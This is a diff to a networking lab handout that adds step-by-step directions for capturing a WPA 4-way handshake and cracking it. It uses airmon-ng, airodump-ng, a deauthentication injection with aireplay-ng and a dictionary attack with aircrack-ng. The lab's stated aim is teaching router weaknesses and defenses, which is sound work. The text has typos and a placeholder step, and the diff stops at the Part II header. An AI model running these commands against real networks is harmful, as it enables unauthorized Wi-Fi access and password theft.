@@ -4,10 +4,38 @@ Networking Lab Direcitons
 Networking Lab Directions
 Purpose: 
 ---------
-The purpose of this networking lab is to familiarize individuals with Wireshark and also to help students learn how to intercept and read packets. 
+The purpose of this networking lab is to familiarize individuals with Wireshark and also to help students learn 
+how to intercept and read packets. This lab takes a look at packet sniffing and also packet injection otherwise known 
+as de-authentication attacks. Familiarizing students with the knowledge on how to execute these types of attacks will help
+them learn what vulnerabilities routers have and how to protect against them.
 
 Part I: Unauthorized Wi-Fi Access
 -----------------------------------
+1.	Run Air Crack
+2.	Run Air Dump
+3.	Run Air ---------
+4.	Open up terminal 
+5.	Run ifconfig and note the different interfaces
+6.	Run command:
+airmon-ng 
+7.	Take a look at the different interfaces. We will be using (insert interface here) for this lab.
+8.	Execute the command:
+airmon-ng (insert interface here)
+9.	Do an ifconfig and take note of the new interface name.
+10.	Next run the command:
+airodump-ng mon0
+11.	Locate the access point from the different SSID’s. What is the SSID name? What encryption type is it? What is the MAC address? What channel is it on?
+
+12.	Execute this command:
+airodump-ng –bsid {insert SSID MAC address here} --channel {SSID channel} --write {File Output Name} mon0
+13.	Next we are going to do a packet injection so that we can get access to the 4-way handshake between the router and the host. Execute the following command:
+aireplay-ng -0 3 -a {SSID MAC address} -c {host MAC address} mon0
+14.	In order to see if the packet injection worked, we are going to have to open wireshark and look at the captured packets using the previously specified file name.
+15.	What packet shows that the packet injection was successful? What protocol was used?
+
+16.	So, now that the packet injection was successful, we can now crack the password using a dictionary attack. Execute the following command in the terminal:
+aircrack-ng {insert previous file name} -w {location of dictionary} 
+What is the password for the wireless network?
 
 
 Part II: Unauthorized Administrator Access
